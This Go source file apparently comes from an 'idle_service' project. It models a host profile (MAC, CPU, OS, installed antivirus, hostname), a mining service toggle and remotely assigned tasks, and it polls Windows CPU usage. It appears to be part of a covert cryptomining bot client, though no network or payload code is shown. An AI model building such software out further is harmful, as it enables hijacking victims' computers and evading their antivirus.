package models

import (
	"os"
	"runtime"
	"time"

	"github.com/gonutz/w32"
	"github.com/monsun69/idle_service/lib/sysinfo"
)

type Main struct {
	System      System
	Version     int
	CurrentTask Task
	Mining      Mining
}

type Mining struct {
	ServiceName string
	Status      bool
	Enable      bool
}

type Task struct {
	Id   string
	Type int
	Args []string
}

type System struct {
	Mac         string
	Cores       int
	Arch        string
	Os          string
	Av          string
	Cpu         string
	CpuUtil     int
	Workstation string
}

func (e *Main) Init() {
	e.Version = 1
	e.System.Init()
}

func (c *System) Init() {
	c.Mac = sysinfo.GetMacAddr()
	c.Cores = runtime.NumCPU()
	c.Arch = runtime.GOARCH
	c.Cpu = sysinfo.GetCpuName()
	c.Av = sysinfo.GetAvName()
	c.Os = sysinfo.GetOsName()
	c.Workstation, _ = os.Hostname()
	go c.getCpuUtilization(true)

}

func (c *System) getCpuUtilization(loop bool) {
	var idle, kernel, user w32.FILETIME
	for {
		w32.GetSystemTimes(&idle, &kernel, &user)
		idleFirst := idle.DwLowDateTime | (idle.DwHighDateTime << 32)
		kernelFirst := kernel.DwLowDateTime | (kernel.DwHighDateTime << 32)
		userFirst := user.DwLowDateTime | (user.DwHighDateTime << 32)

		time.Sleep(time.Second)

		w32.GetSystemTimes(&idle, &kernel, &user)
		idleSecond := idle.DwLowDateTime | (idle.DwHighDateTime << 32)
		kernelSecond := kernel.DwLowDateTime | (kernel.DwHighDateTime << 32)
		userSecond := user.DwLowDateTime | (user.DwHighDateTime << 32)

		totalIdle := float64(idleSecond - idleFirst)
		totalKernel := float64(kernelSecond - kernelFirst)
		totalUser := float64(userSecond - userFirst)
		totalSys := float64(totalKernel + totalUser)

		c.CpuUtil = int((totalSys - totalIdle) * 100 / totalSys)
		if !loop {
			break
		}
	}
}
